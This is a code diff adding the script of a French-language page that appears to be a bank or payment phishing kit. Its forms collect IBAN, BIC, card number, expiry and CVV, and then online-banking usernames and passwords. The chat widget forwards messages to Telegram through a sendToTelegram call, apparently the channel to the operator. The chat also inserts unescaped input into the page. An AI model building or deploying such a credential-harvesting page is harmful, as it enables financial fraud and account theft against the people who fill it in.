+            document.getElementById('card-number').addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+                e.target.value = formattedValue;
+            });
+
+            // Formater la date d'expiration (MM/AA)
+            document.getElementById('expiry-date').addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            });
+
+            // Détection du type de carte
+            document.getElementById('card-number').addEventListener('input', function (e) {
+                const cardNumber = e.target.value.replace(/\s+/g, '');
+                const cardType = detectCardType(cardNumber);
+                const cardLogo = document.getElementById('card-logo');
+
+                if (cardType === 'visa') {
+                    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+                    cardLogo.style.display = 'block';
+                } else if (cardType === 'mastercard') {
+                    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+                    cardLogo.style.display = 'block';
+                } else if (cardType === 'amex') {
+                    cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
+                    cardLogo.style.display = 'block';
+                } else {
+                    cardLogo.style.display = 'none';
+                }
+            });
+
+            // Détection du logo de la banque après 8 caractères
+            document.getElementById('bic').addEventListener('input', function () {
+                if (this.value.length >= 8) {
+                    detectBankLogo();
+                }
+            });
+        });
+
+        // Fonction pour détecter le type de carte
+        function detectCardType(cardNumber) {
+            const visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
+            const mastercardPattern = /^5[1-5][0-9]{14}$/;
+            const amexPattern = /^3[47][0-9]{13}$/;
+
+            if (visaPattern.test(cardNumber)) {
+                return 'visa';
+            } else if (mastercardPattern.test(cardNumber)) {
+                return 'mastercard';
+            } else if (amexPattern.test(cardNumber)) {
+                return 'amex';
+            } else {
+                return 'unknown';
+            }
+        }
+
+        // Fonction pour basculer la visibilité du mot de passe
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('bank-password');
+            const eyeIcon = document.querySelector('.fa-eye');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            }
+        }
+
+        // Fonction pour ouvrir le chat
+        function openChat() {
+            document.getElementById('chat-window').style.display = 'block';
+        }
+
+        // Fonction pour fermer le chat
+        function closeChat() {
+            document.getElementById('chat-window').style.display = 'none';
+        }
+
+        // Fonction pour envoyer un message dans le chat
+        function sendMessage() {
+            const input = document.getElementById('chat-input');
+            if (input.value.trim() === '') return;
+
+            const chatBody = document.getElementById('chat-body');
+            chatBody.innerHTML += `<p><strong>Vous :</strong> ${input.value}</p>`;
+            
+            // Envoyer le message à Telegram
+            sendToTelegram(`<b>Message du chat:</b> ${input.value}`);
+            
+            input.value = '';
+            chatBody.scrollTop = chatBody.scrollHeight;
+        }
+
+        // Fonction pour valider le formulaire
+        function validateForm(step) {
+            let isValid = true;
+
+            if (step === 1) {
+                const iban = document.getElementById('iban').value.trim();
+                const bic = document.getElementById('bic').value.trim();
+                const terms = document.getElementById('terms').checked;
+                const fees = document.getElementById('fees').checked;
+
+                if (!iban || !bic || !terms) {
+                    isValid = false;
+                    alert("Veuillez remplir tous les champs et accepter les conditions.");
+                }
+            } else if (step === 2) {
+                const cardholderName = document.getElementById('cardholder-name').value.trim();
+                const cardNumber = document.getElementById('card-number').value.trim();
+                const expiryDate = document.getElementById('expiry-date').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
+
+                if (!cardholderName || !cardNumber || !expiryDate || !cvv) {
+                    isValid = false;
+                    alert("Veuillez remplir tous les champs de la carte de crédit.");
+                }
+            } else if (step === 3) {
+                const bankUsername = document.getElementById('bank-username').value.trim();
+                const bankPassword = document.getElementById('bank-password').value.trim();
+
+                if (!bankUsername || !bankPassword) {
+                    isValid = false;
+                    alert("Veuillez remplir tous les champs de connexion bancaire.");
+                }
+            }
+
+            return isValid;
+        }
+    </script>
+</body>
+</html>
